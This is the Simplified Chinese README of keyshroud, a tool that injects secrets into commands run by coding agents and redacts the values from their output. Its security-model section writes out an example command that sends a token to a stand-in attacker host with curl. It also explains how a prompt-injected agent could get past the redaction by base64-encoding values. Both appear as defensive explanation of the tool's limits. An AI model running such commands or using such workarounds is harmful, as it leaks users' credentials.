<div align="center">

<h1>
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/dinhkarate/keyshroud/main/assets/brand/lockup-dark.svg">
    <img alt="keyshroud" src="https://raw.githubusercontent.com/dinhkarate/keyshroud/main/assets/brand/lockup.svg" height="88">
  </picture>
</h1>

**智能体可以使用密钥，但永远看不到密钥值。**

keyshroud 让 Claude Code、Codex、Cursor、Cline、OpenCode、Gemini CLI、pi 和 omp 可以运行
需要 API 密钥的命令，而每个密钥值到达模型时都只是 `<redacted:NAME>`。

[![npm](https://img.shields.io/npm/v/keyshroud.svg)](https://www.npmjs.com/package/keyshroud)
[![Downloads](https://img.shields.io/npm/dm/keyshroud.svg)](https://www.npmjs.com/package/keyshroud)
[![CI](https://github.com/dinhkarate/keyshroud/actions/workflows/ci.yml/badge.svg)](https://github.com/dinhkarate/keyshroud/actions/workflows/ci.yml)
[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](../LICENSE)
[![Node](https://img.shields.io/node/v/keyshroud.svg)](../package.json)

[快速开始](#快速开始) · [密钥存储位置](#密钥存储位置) · [支持的智能体](#支持的智能体) · [最小权限](#最小权限) · [CLI](#cli-参考) · [对比](#与其他方案的比较) · [安全模型](#安全模型) · [常见问题](#常见问题) · [文档](#文档) · [网站](https://keyshroud.dev)

[🇬🇧 English](../README.md) · [🇻🇳 Tiếng Việt](README.vi.md) · [🇨🇳 简体中文](README.zh-CN.md) · [🇯🇵 日本語](README.ja-JP.md)

</div>

<p align="center"><img src="../assets/demo.gif" alt="演示：在一台新机器上，keyshroud add 通过脱敏提示符把 GitHub 令牌存入本地密钥库，keyshroud run 对命令输出中的令牌脱敏，scan 找出泄露到文件的副本" width="860"></p>

```console
$ keyshroud run --mask -- sh -c 'echo "deploying with $GH_TOKEN"; gh api user -q .login'
deploying with <redacted:GH_TOKEN>
dinhkarate
```

命令会拿到真实的令牌。对话记录以及读取它的模型看到的只有
`<redacted:GH_TOKEN>`。（智能体执行命令时会自动脱敏；
在人工操作的终端中可用 `--mask` 强制开启。）

## 为什么需要 keyshroud？

编程智能体要完成实际工作就需要凭据：`gh`、`npm publish`、云服务 CLI、webhook、
数据库。常见的交付方式都会泄露：

| 常见做法 | 出问题的地方 |
|---|---|
| 把密钥粘贴到聊天中 | 它会留在对话记录、服务商日志，以及之后的每个上下文窗口中 |
| 放进 `.env` | 智能体调试时会 `cat` 这个文件，或者把它提交进仓库 |
| 使用密钥库 MCP 服务器 | 大多数会把明文值直接返回给模型 |
| 购买密钥管理服务 | `op run` 需要 1Password 订阅，而且它只会对你包装过的命令脱敏 |

keyshroud 采用另一种方式：**智能体使用名称，命令取得值，命令打印的任何内容
都会在模型读到前脱敏。**

- **名称，而非值。** 智能体看到的是 `GH_TOKEN` 和 `keyshroud://GitHub token`，永远看不到令牌。
- **输出脱敏。** 到达 stdout 或 stderr 的值会变成 `<redacted:GH_TOKEN>`，无论是你包装过的命令，
  还是 Claude Code 和 pi 中未包装的命令。
- **无需设置。** 加密的密钥库文件，其密钥存放在操作系统的钥匙串中。无需账号或服务器。
- **已有密钥库则可直接使用。** 多台机器可以使用 Vaultwarden 或 Bitwarden；HashiCorp Vault、
  OpenBao、Infisical、1Password、AWS、Google Cloud 和 Azure 在它们所在的地方被读取，从不写入。
- **免费。** MIT 许可，没有遥测。

## 快速开始

**环境要求：** Node.js ≥ 18.19。别的什么都不需要。

```bash
npm install -g keyshroud

# 1. 保存密钥：在脱敏提示符中输入，不会回显。
#    第一个密钥会创建本地密钥库。
keyshroud add --env GH_TOKEN --item "GitHub token"

# 2. 使用
keyshroud run -- gh auth status
keyshroud run -- claude          # 启动智能体，所有已绑定的密钥都可用

# 3. 全面检查
keyshroud doctor
```

```console
$ keyshroud add --env GH_TOKEN --item "GitHub token"
Paste secret for GH_TOKEN: ****************************************
keyshroud: created the local vault ~/.config/keyshroud/vault.json; its key is in the macOS keychain (keyshroud-vault-9f2c4e6a1b3d5f70), so programs running as you can open it without asking.
created item=GitHub token env=GH_TOKEN targets=~/.config/keyshroud/env.json verified=yes
```

- **智能体也可以启动它。** 没有终端时，`add` 会在桌面上打开一个隐藏输入的对话框：
  智能体运行命令，你粘贴值。密钥值绝不会经由聊天传递。
- **已经有 `.env`？** `keyshroud import` 把其中的密钥移入密钥库，并写出一个
  可以提交的 `.env.refs` 引用文件。
- **或者让智能体完成安装。** 把这句话粘贴到 Claude Code、Codex、Cursor、OpenCode 或 pi：
  `Read https://keyshroud.dev/install.md and set up keyshroud for me.`

## 主要功能

**确保密钥值不进入模型**

| | |
|---|---|
| 🙈 **输出脱敏** | `keyshroud run` 会把 stdout 和 stderr 中的每个密钥值替换为 `<redacted:NAME>`，无论退出码为何；即使值被拆分到两个数据块中，也不会漏过。 |
| 🪝 **智能体钩子** | pi/omp 的钩子会对每个工具结果脱敏。Claude Code 的 `PostToolUse` 钩子会对每个成功结果（Bash、Read、Grep、MCP 等）脱敏，而 [`keyshroud claude-guard`](#guard失败的命令也会脱敏) 会在 Bash 命令写入输出时对其脱敏，包括失败命令的输出。 |
| 🔌 **MCP 服务器** | 面向没有 Shell 的客户端：`secrets_run`、`secrets_list`、`secrets_request`、`vault_status`。没有任何工具会返回密钥值。 |
| ⌨️ **粘贴即可创建** | 新密钥会通过终端中的脱敏提示符、智能体启动 `add` 时桌面上的隐藏输入对话框，或 pi 中的脱敏弹窗输入，绝不会经由聊天传递。 |
| 🔎 **`scan`** | 在提交前找出泄露到工作区的密钥库值。 |

**密钥的存储位置**

| | |
|---|---|
| 🔐 **本地密钥库** | 一个以 AES-256-GCM 加密的文件，密钥存放在 macOS 钥匙串、Linux Secret Service 或 Windows DPAPI 中；没有这些机制的环境使用口令；在 Mac 上如需每次确认，可使用 Touch ID。 |
| 💾 **备份** | `keyshroud backup` 会把本地密钥库复制到一个使用独立口令加密的文件；`keyshroud restore` 可在任意机器上恢复它并重新绑定名称。 |
| 🔄 **同步** | 同一批密钥需要到达多台机器时，用 $5 VPS 或树莓派上的 Vaultwarden，或者 Bitwarden。 |
| 🏢 **团队密钥管理器** | `vault://`、`infisical://`、`op://`、`awssecrets://`、`awsssm://`、`gcpsecrets://`、`azurekeyvault://`：只读来源，会像其他密钥一样被注入并脱敏。 |

**使用方式**

| | |
|---|---|
| 🔗 **可提交的引用** | `.env.refs` 文件中的 `GH_TOKEN=keyshroud://GitHub token`：只有名称，没有值，可安全提交。 |
| 🎯 **项目作用域** | 仓库中的 `.keyshroud.json`（`{ "only": ["STRIPE_*", "GH_TOKEN"] }`）会将该项目中 `run`、`env` 和智能体可获取的密钥限制为项目所需的名称。 |
| 📄 **`inject`** | 将 `{{ keyshroud://… }}` 模板渲染为权限为 `0600` 的文件，供无法读取环境变量的工具使用（`.npmrc`、kubeconfig）。 |
| 🧾 **审计日志** | `audit.jsonl` 记录哪些*名称*在何时被哪条命令使用，从不记录值。 |
| ⚡ **快速** | 本地密钥库在离线状态下也能在毫秒级响应。使用 Vaultwarden 时，每个会话只需一次批量 `bw list items`，而不是每个密钥一次 `bw get`（约 3 秒）。 |

## 使用场景

**“Claude Code 总是读取我的 `.env`。”** 运行 `keyshroud import` 把值移入密钥库，
并写出一个 `.env.refs`，其中的行像 `GH_TOKEN=keyshroud://myapp GH_TOKEN`，然后用
`keyshroud run --env-file .env.refs -- claude` 启动智能体。插件的钩子会对任何仍然
出现在工具结果中的内容脱敏。

**“一条失败的命令把我的令牌打印进了对话记录。”** 启用
[`keyshroud claude-guard`](#guard失败的命令也会脱敏)：Claude Code 中 Bash 命令写入的所有输出
都会在写出时脱敏，无论命令成功还是失败。

**“我们公司把密钥放在 HashiCorp Vault 里。”** 先运行一次 `keyshroud source add vault --addr https://vault.example.com`，
然后在 `.env.refs` 中写入 `DB_PASSWORD=vault://secret/myapp/db#password`。智能体看到的是名称；
值从 Vault 读取，并在输出中脱敏。
[OpenBao、Infisical、1Password、AWS、Google Cloud 和 Azure](#团队密钥管理器vault-openbao-infisical-1password-aws-google-cloud-azure) 也是如此。

**“这个仓库只应获得自己的密钥。”** `keyshroud scope --only 'STRIPE_*,GH_TOKEN'` 会写入一个
[`.keyshroud.json`](#最小权限项目自身的名称)：其中工作的智能体无法获得其他项目的令牌。

**“我喜欢 `op run`，但不想用 1Password。”** `keyshroud run` 采用同一思路：输入引用，
输出经过脱敏，而密钥库存放在自己的机器或自行托管的服务器上。

**“我的智能体需要添加新密钥。”** 它会运行 `keyshroud add` 或调用 `secrets_request`（MCP），
你的桌面上会弹出隐藏输入的对话框；在 pi 里是 `/secret`。你在那里粘贴值。

## 密钥存储位置

| | 适合 | 需要 |
|---|---|---|
| [**本地密钥库**](#本地密钥库)（默认） | 一台机器，无需配置 | 无需任何额外条件 |
| [**Vaultwarden 或 Bitwarden**](#跨机器同步vaultwarden-或-bitwarden) | 同一批密钥在多台机器上 | 一个 Bitwarden 账号或你自己的 Vaultwarden，以及 `bw` CLI |
| [**团队密钥管理器**](#团队密钥管理器vault-openbao-infisical-1password-aws-google-cloud-azure) | 公司已存放在某处的密钥 | 你在其中的现有登录凭据 |

它们可以并用：引用会指明所属的密钥库（`keyshroud://…`、`bw://…`、`vault://…`）。

### 本地密钥库

`~/.config/keyshroud/vault.json` 保存所有条目，并使用一把随机的 256 位密钥以 AES-256-GCM 加密。
条目名称也会被加密。密钥存储位置取决于机器：

| 机器 | 密钥 | 解锁 |
|---|---|---|
| macOS | 登录钥匙串 | 不需要 |
| macOS，Touch ID（`KEYSHROUD_VAULT_KEY=secure-enclave`） | 由 Secure Enclave 中的密钥包装 | 命令需要密钥时使用 Touch ID；一个会话持续 30 分钟 |
| 有桌面钥匙环的 Linux | Secret Service | 不需要 |
| Windows | DPAPI，绑定你的 Windows 账户 | 不需要 |
| Docker、服务器、SSH、没有 systemd 的 Linux | 由口令派生（scrypt） | `keyshroud unlock`；一个会话持续 30 分钟 |

丢失的密钥或忘记的口令无法恢复，`vault.json` 复制到另一台机器上在那里也打不开：
请使用备份。详见 [docs/local-vault.md](../docs/local-vault.md)。

### 备份与恢复

```bash
keyshroud backup                           # 要求设置新口令，并写入 ./keyshroud-backup-<date>.json
keyshroud restore keyshroud-backup-….json  # 显示将添加的内容；加 --yes 才执行
```

备份是一个文件，使用你选择的口令加密，而不是这台机器的密钥，因此可以在任何地方打开。
`restore` 会先打印一份名称计划；本机已有不同值的条目会被保留，除非你添加 `--replace`，
然后重新绑定变量名：在新机器上，`keyshroud restore FILE --yes` 即可完成迁移。两者都只能在终端中运行。
[详情](../docs/local-vault.md#backup-and-restore)。

### 跨机器同步：Vaultwarden 或 Bitwarden

```bash
npm install -g @bitwarden/cli
bw config server https://vault.example.com     # 自托管 Vaultwarden；bitwarden.com 请跳过
bw login
mkdir -p ~/.config/keyshroud && echo bw > ~/.config/keyshroud/backend   # 新条目会存入此处
keyshroud unlock                                # 30 分钟；不会保存主密码
```

`run`、各个钩子、MCP 服务器以及其他所有功能都会以相同方式通过 Bitwarden CLI 工作。还没有
服务器？[examples/vaultwarden](../examples/vaultwarden#readme) 会使用 Docker Compose 和 Caddy，
将空白 VPS 配置到可以运行 `keyshroud doctor`。会话、无需询问即可解锁、迁回本地密钥库，以及独立的
智能体账号，详见 [docs/vaultwarden.md](../docs/vaultwarden.md)。

### 团队密钥管理器：Vault, OpenBao, Infisical, 1Password, AWS, Google Cloud, Azure

公司通常已有密钥管理器。keyshroud 从中读取，绝不写入：
引用会指明使用哪个密钥，而不会将任何内容复制到 keyshroud 的密钥库。

```bash
keyshroud source add vault --addr https://vault.example.com    # 使用 `vault login` 的令牌读取
keyshroud wire --env DB_PASSWORD --item 'vault://secret/myapp/db#password'
keyshroud run --only DB_PASSWORD -- ./migrate.sh
```

```dotenv
# .env.refs：可安全提交，仅含名称
DB_PASSWORD=vault://secret/myapp/db#password
STRIPE_KEY=awssecrets://prod/stripe#api_key
SENTRY_DSN=op://Engineering/Sentry/dsn
```

| 系统 | 引用 | 登录凭据 |
|---|---|---|
| HashiCorp Vault、OpenBao（KV v1 和 v2） | `vault://<mount>/<path>#<field>` | `source add vault`：`vault login` 的令牌、令牌或 AppRole |
| Infisical（云端或自托管） | `infisical://<project id>/<environment>/[<folder>/]<NAME>` | `source add infisical`：机器身份 |
| AWS Secrets Manager、SSM Parameter Store | `awssecrets://<name or ARN>[#<json key>]`、`awsssm://<parameter>` | 你的 `aws` CLI |
| 1Password | `op://<vault>/<item>/<field>` | 你的 `op` CLI |
| Google Cloud Secret Manager | `gcpsecrets://<project>/<secret>[#<json key>]` | 你的 `gcloud` CLI |
| Azure Key Vault | `azurekeyvault://<vault name>/<secret>[#<json key>]` | 你的 `az` CLI |

只读、仅限 HTTPS，且引用永远不能指定服务器，因此克隆仓库中的 `.env.refs` 无法将你的
令牌发送到别处。Vault、OpenBao 和 Infisical 在 CI 中针对真实服务器测试；`op`、`gcloud` 和 `az`
路径针对替身 CLI 测试。所有选项和限制：
[docs/team-secret-managers.md](../docs/team-secret-managers.md)。

## 支持的智能体

| 智能体 | 安装 | 提供的功能 |
|---|---|---|
| **Claude Code** | [插件](#claude-code) | SessionStart + PostToolUse 脱敏钩子、技能；[`claude-guard`](#guard失败的命令也会脱敏) 也会对失败命令脱敏 |
| **pi / omp** | [`pi install npm:keyshroud`](#pi--omp) | 环境变量注入、`tool_result` 脱敏（也包括失败调用）、`/secret` |
| **Codex、OpenCode、Gemini CLI、Cursor 智能体** | [`npx skills add dinhkarate/keyshroud`](#其他具备-shell-的智能体) | 技能 + 输出经脱敏的 CLI |
| **Claude Desktop、纯聊天客户端** | [`mcpServers` JSON](#无-shell-的-mcp-客户端) | 输出经脱敏的 MCP 工具 |
| **任意 Shell 或 CI** | `keyshroud run -- <cmd>` | 环境变量注入 + 输出脱敏 |

具备 Shell 的智能体使用 CLI：无需在上下文中提供工具 schema，且 `keyshroud run` 无论退出码
为何都会对输出脱敏。MCP 服务器面向无法运行命令的客户端。

### Claude Code

```bash
npm install -g keyshroud
```
```text
/plugin marketplace add dinhkarate/keyshroud
/plugin install keyshroud@keyshroud
```

- **SessionStart 钩子：** 告诉 Claude 存在哪些密钥*名称*，绝不询问密码。
- **PostToolUse 钩子：** 把任何包含密钥值的成功工具结果改写为
  `<redacted:NAME>`。
- **技能：** 教 Claude 使用名称和引用，并通过 `keyshroud run` 运行
  使用密钥的命令。

通过 keyshroud 启动 Claude，让它的 Bash 命令获得密钥：`keyshroud run -- claude`。
密钥库中的条目也可以是 Claude Code 自己的 API key（`keyshroud claude-setup --item "Anthropic API key"`）。
其余内容在 [docs/claude-code.md](../docs/claude-code.md)。

### guard：失败的命令也会脱敏

```bash
keyshroud claude-guard          # 启用（macOS、Linux）；在新的 Claude Code 会话中生效
keyshroud claude-guard --off
```

Claude Code 无法改写失败命令的输出，因此仅靠钩子时，这些命令的输出不会脱敏。启用 guard 后，
Claude Code 会通过 keyshroud 启动 Shell：每条 Bash 命令都在实际的 bash 或 zsh 中运行，
其输出在前往 Claude Code 的途中会经过脱敏进程。无论命令成功、失败还是被中断，
也无论是否通过 `keyshroud run` 运行，值都会变成 `<redacted:NAME>`。如果脱敏进程无法启动，
命令不会运行，而不会以未脱敏的方式运行。每条命令约增加 0.2 秒开销。
[工作原理和限制](../docs/claude-code.md#the-guard-failed-commands-masked-too)。

### pi / omp

```bash
pi install npm:keyshroud
```

扩展会在提供商认证完成前将已绑定的密钥放入智能体环境，对每个工具结果
（无论成功或失败）以及你输入的 `!commands` 输出脱敏，并添加 `/secret`（描述、确认名称、脱敏粘贴）。
[详情](../docs/agents.md#pi--omp)。

### 其他具备 Shell 的智能体

Codex、OpenCode、Gemini CLI、Cursor 智能体，以及其他任何能运行命令的工具：安装
CLI 和技能，技能会教智能体将使用密钥的命令通过 `keyshroud run -- …` 运行，并用
`keyshroud add` 存入新密钥。

```bash
npm install -g keyshroud
npx skills add dinhkarate/keyshroud
```

`npx skills` 需要 Node.js 22.20+；在更旧的 Node 上，[复制 CLI 附带的技能](../docs/agents.md#other-agents-with-a-shell)。

### 无 Shell 的 MCP 客户端

Claude Desktop、纯聊天客户端，或者你不允许运行命令的智能体：

```json
{ "mcpServers": { "keyshroud": { "command": "keyshroud", "args": ["mcp"] } } }
```

`secrets_run` 会在注入密钥后运行命令，并返回其退出码和脱敏输出；
`secrets_list`、`secrets_request` 和 `vault_status` 提供其余功能。没有任何一个会返回密钥值。
[详情](../docs/agents.md#mcp-clients-without-a-shell)。

## 最小权限

默认情况下，`keyshroud run` 会将每个已绑定的密钥交给命令。可通过三种方式限制：

- **按命令：** `keyshroud run --only GH_TOKEN -- gh pr list` 只注入那个名字，并从
  命令继承的内容里移除其他已绑定的名字。如果那个名字无法解析（密钥库已锁定、条目不存在），命令不会运行。
- **按项目：** 使用下方的作用域文件。
- **按密钥库：** 使用 Vaultwarden 时，`keyshroud setup` 会给智能体一个专用账号。

### 最小权限：项目自身的名称

```bash
cd ~/code/shop
keyshroud scope --only 'STRIPE_*,GH_TOKEN'   # 写入 ./.keyshroud.json
keyshroud scope                              # 显示此处的作用域内容及不在其中的名称数量
```

```json
{ "only": ["STRIPE_*", "GH_TOKEN"] }
```

在该目录及其子目录中，`run`、`env`、`secrets_run`、pi 的 Shell，以及 Claude Code 在会话开始时
获知的名称，都会限制为作用域内的名称；作用域外的名称会被拒绝。文件
仅保存名称和模式，因此可以提交。脱敏范围不会缩小：作用域外的值若出现在输出中，仍会脱敏。无法被读取为
作用域的文件会使作用域为空，而不是让所有名称都进入作用域。这是防止误操作的默认设置，不是一堵墙：
[docs/project-scope.md](../docs/project-scope.md)。

### 最小权限：独立的智能体账号

使用 Vaultwarden 或 Bitwarden 时，一个已解锁的会话可访问整个密钥库。`keyshroud setup --email
you+agent@example.com` 会在只保存智能体所需密钥的专用账号上为 keyshroud 创建自己的 `bw` 登录，
`keyshroud migrate` 会将已绑定的条目复制过去。
[docs/vaultwarden.md](../docs/vaultwarden.md#least-privilege-a-separate-agent-account)。

## CLI 参考

```text
Store     keyshroud add --env NAME --item ITEM        store a new secret (masked prompt or dialog)
          keyshroud import [--yes]                    move a .env into the vault, write .env.refs
          keyshroud rotate --item ITEM                replace a value
          keyshroud wire | unwire | list | rm         manage names and items
Use       keyshroud run [--only A,B] [--env-file F] -- <cmd>
          keyshroud inject -i template -o out         render a template into a 0600 file
          keyshroud env                               the names available here
Check     keyshroud doctor | status | scan [paths] | redact < log.txt
Narrow    keyshroud scope [--only A,B_* | --clear]    this directory's .keyshroud.json
Vault     keyshroud unlock | lock | rekey | backup | restore FILE
Sources   keyshroud source [add vault|infisical … | rm …]
Agents    keyshroud mcp | claude-setup | claude-guard [--off] | link-cli
```

| 引用 | 解析为 |
|---|---|
| `keyshroud://GitHub token` | 本地密钥库中保存的值（`/notes` 获取其备注） |
| `bw://GitHub CLI token` | 一个 Vaultwarden 登录的密码（`/username`、`/notes`、`/totp`、`/fields/<name>`） |
| `vault://secret/myapp/db#password` | HashiCorp Vault 或 OpenBao 中一个 KV 密钥的字段 |
| `op://Engineering/Sentry/dsn` | `op read` 为它返回的内容（1Password） |
| `awssecrets://prod/stripe#api_key` | AWS Secrets Manager 里一个 JSON 密钥中的一个键 |

**退出码：** `0` 成功 · `2` 用法错误 · `3` 密钥库已锁定或不可用 · `4` 密钥缺失或
条目名称有歧义 · `5` 拒绝覆盖已有状态。`run` 以子进程的退出码退出。

每条命令、标志、引用形式和环境变量：[docs/cli.md](../docs/cli.md)。

## 工作原理

```
              ┌──────────────────────────── your machine ─────────────────────────────┐
              │  vault.json ◄── key: keychain · Secret Service · DPAPI · passphrase   │
              │      │                                                                │
              │      ▼                                                                │
 Vaultwarden ◄┼─bw─ keyshroud ── resolves keyshroud:// and bw:// refs ──► command's env   │
 team vault  ◄┼──── (read-only)                                          │            │
              │      └──── redactor ◄──── stdout / stderr ◄──────────────┘            │
              │                │ <redacted:NAME>                                      │
              └────────────────┼──────────────────────────────────────────────────────┘
                               ▼
                  agent transcript / LLM provider
```

1. **绑定。** 密钥按*名称*绑定：`GH_TOKEN → keyshroud://GitHub token`，写入
   `~/.config/keyshroud/env.json` 或项目的 `.env.refs`。只会写入名称和引用。
2. **解析并注入。** 命令运行时，值从密钥库读取，并放入子进程的
   环境变量。绝不会进入 argv 或工具结果。
3. **脱敏。** 命令输出会经过一个知晓所有值的脱敏器。Claude Code 的
   钩子和 guard 在该进程外运行，改用带密钥的 HMAC 指纹索引，
   因此它们从不持有明文。

完整版本：[docs/how-it-works.md](../docs/how-it-works.md)。

## 与其他方案的比较

向智能体提供密钥的工具可分为四类（依据我们于 2026-11-15 阅读的文档；
欢迎在 issue 中提出修正）：

| 方式 | 示例 | 模型能看到值吗？ | 未包装的命令 | 覆盖范围 |
|---|---|---|---|---|
| **输入名称，输出脱敏** | **keyshroud** | 不能：工具输出已脱敏 | Claude Code（钩子，失败命令另加 guard）和 pi/omp 中也会脱敏；其他智能体依赖 `keyshroud run` | 命令从环境变量或文件读取的任何密钥 |
| 对其子进程脱敏的包装器 | 1Password `op run`、`dotenvx run --redact`、`varlock run`、`secretspec run` | 不会通过已包装命令的输出看到 | 不会脱敏 | 同上，但仅限你包装的命令 |
| 密钥库 MCP 服务器 | Bitwarden MCP、HashiCorp Vault MCP、Doppler MCP、Infisical MCP（默认） | 会：工具会返回该值 | 不适用 | 查询密钥 |
| 使用占位符的出口代理 | Infisical Agent Vault、OneCLI、`fnox proxy`、1Password for NVIDIA OpenShell、Claude Code 的 `sandbox.credentials` 脱敏 | 不能：智能体持有的是占位符 | 不适用：真实值从不出现在 Shell 中 | 允许主机的 HTTP(S) 凭据；需要可读取请求的代理 |

keyshroud 让密钥库留在你身边（本地文件、自己的 Vaultwarden，或团队运行的密钥管理器），
无需账号，而且免费。对于其覆盖的凭据，出口代理是对抗恶意或遭提示注入的智能体的更强工具；
keyshroud 覆盖数据库密码、SSH 密钥和签名密钥，以及所有读取环境变量的 CLI。两者可结合使用。如果已经
订阅 1Password，其 `op run` 和 Environments 设计良好，而 keyshroud 也能读取 `op://` 引用。

## 安全模型

keyshroud 防范的是**意外泄露**：密钥因命令打印而进入对话记录、服务商日志、
截图、提交或模型的上下文。

它**不能**让恶意或遭提示注入的智能体变得安全。能够运行
`keyshroud run -- curl https://evil.example -d "$TOKEN"`，或在打印前将值进行 base64 编码的智能体，
可以将其外传。如果这是你的威胁模型，请使用在传输过程中将占位符替换为真实凭据的出口代理，
限制每个会话可获得的密钥（`--only`、作用域），并始终由人工批准命令。

依赖它之前需要知道的：

- **密钥保存在操作系统保存密钥的位置。** 在钥匙串模式下，以你的身份运行的任何程序都能打开
  本地密钥库，包括智能体。使用口令创建密钥库，或在 Mac 上使用 Touch ID，以便在需要时确认。
- **脱敏采用精确匹配。** 部分值或经过变换的值（`${TOKEN:0:10}`、base64）不会脱敏，
  短于 6 个字符的值永远不会脱敏。
- **在 Claude Code 中，失败的命令只有在启用 guard 时**，或通过 `keyshroud run` 运行时，才会脱敏。
- **作用域和 guard 是默认设置，不是墙。** 以你的身份运行的程序可以修改它们。
- **值永远不会出现在** argv、日志、keyshroud 自己的诊断、MCP 结果、hook 输出或
  审计日志里。这一点有测试。

我们测试的每一项保证和每一个已知限制：[docs/security.md](../docs/security.md)。私下
报告漏洞，见 [SECURITY.md](../SECURITY.md)。

## 常见问题

**一定要用 Vaultwarden 吗？** 不必。默认情况下，密钥保存在机器上的一个加密文件中。
Vaultwarden 或 Bitwarden 是可选的，用于在多台机器上使用同一批密钥。

**密钥会离开我的机器吗？** 使用本地密钥库时不会。keyshroud 没有自己的后端，也
不发送遥测；值只会进入所运行命令的环境变量。

**智能体还能使用密钥吗？** 可以。命令会拿到真实值；只有模型读到的文本会脱敏。

**这是沙箱吗？** 不是。它阻止的是*意外*泄露。参见[安全模型](#安全模型)。

**Claude Code 不是自己就能做这件事吗？** 部分可以，而且方式不同。Claude Code 可以拒绝对
`.env` 这类文件的读取，它的沙箱可以让命令看到凭据的占位符，并把真实值放到对你允许的主机的
请求上（`sandbox.credentials`，需要开启，仅限沙箱化的 Bash）。它没有密钥存储，也不会改写
工具打印的内容。keyshroud 是该存储，在各智能体之间行为一致，并对输出脱敏；两者可以结合。

**为什么不用 `.gitignore` 忽略我的 `.env`？** 那只能阻止提交，挡不住读取。智能体调试时会读
`.env`，而它读到的内容都会发给模型服务商。

**我们公司用 HashiCorp Vault（或 AWS、1Password 等）。我必须把密钥搬走吗？** 不必。
keyshroud 在它们所在的地方读取，从不写入。

**怎么备份本地密钥库？** `keyshroud backup`。直接复制 `vault.json` 不是
备份：它只能用它的密钥打开，而密钥留在这台机器的密钥存储里。

**支持 Windows 吗？** 支持，已在 Windows 10 和 Node 22 上测试；guard 仅限 macOS 和 Linux。

更多内容，包括 CI、Docker 和从 0.7 升级：[docs/faq.md](../docs/faq.md)。

## 文档

这些页面也可以在 [keyshroud.dev/docs](https://keyshroud.dev/docs/) 阅读，排版更易读。

| | |
|---|---|
| [把项目从 `.env` 迁出](../docs/migrate-from-dotenv.md) | 指南：`import`、`.env.refs`、删除明文、队友需要做什么 |
| [CI 和 Docker](../docs/ci-and-docker.md) | 指南：在 GitHub Actions、Docker 构建和容器中使用口令密钥库 |
| [轮换已泄露的密钥](../docs/rotate-a-key.md) | 指南：找出副本、替换值、哪些地方会自动使用新值 |
| [故障排查](../docs/troubleshooting.md) | 名称无法解析、密钥库已锁定、值未经脱敏就被打印 |
| [本地密钥库](../docs/local-vault.md) | 密钥模式、Touch ID、会话、备份与恢复 |
| [Vaultwarden 或 Bitwarden](../docs/vaultwarden.md) | 同步设置、会话、独立的智能体账号、迁回本地密钥库 |
| [团队密钥管理器](../docs/team-secret-managers.md) | Vault、OpenBao、Infisical、1Password、AWS、Google Cloud、Azure |
| [项目作用域](../docs/project-scope.md) | `.keyshroud.json`：其限制范围及未限制的内容 |
| [Claude Code](../docs/claude-code.md) | 插件钩子、`claude-setup`、guard |
| [pi、omp 和其他智能体](../docs/agents.md) | pi/omp 扩展、技能、MCP 服务器 |
| [CLI 参考](../docs/cli.md) | 所有命令、引用形式、退出码和环境变量 |
| [工作原理](../docs/how-it-works.md) | 绑定、解锁、解析、注入、脱敏 |
| [安全模型](../docs/security.md) | 我们测试的保证，以及已知限制 |
| [常见问题](../docs/faq.md) | Windows、升级、简短解答 |
| [智能体安装指南](https://keyshroud.dev/install.md) | 为 AI 智能体编写的分步安装说明 |

docs/ 下的页面均为英文。

## 开发

```bash
npm install
npm run check        # 类型检查 + 测试（替身 bw，无真实密钥库）+ 构建
# 在 Docker 中针对真实服务器测试各个来源（Vault、OpenBao、Infisical、一个 AWS 模拟器）：
export $(sh test/live-servers.sh) && node --test test/live.test.ts; sh test/live-servers.sh down
node src/cli.ts doctor   # 从源码运行（Node ≥ 22.18 会移除类型）
```

参见 [CONTRIBUTING.md](../CONTRIBUTING.md)。与运行时无关的核心位于 `src/core.ts`（本地密钥库的
文件格式在 `src/vault.ts`，各来源的协议在 `src/sources.ts`）；智能体集成
在 `extensions/`、`src/mcp.ts` 和 `src/hooks.ts`。

## 致谢

受 [@jmcombs/pi-1password](https://www.npmjs.com/package/@jmcombs/pi-1password) 启发：它的弹窗
UI 和诊断界面布局被移植到此处（MIT）。输出脱敏沿用 1Password 的 `op run`。与 Anthropic、
Bitwarden, Inc.、Vaultwarden 项目或此处提到的任何厂商均无关联；
“Bitwarden” 是 Bitwarden, Inc. 的商标。

## 许可证

[MIT](../LICENSE) © 2026 dinhkarate
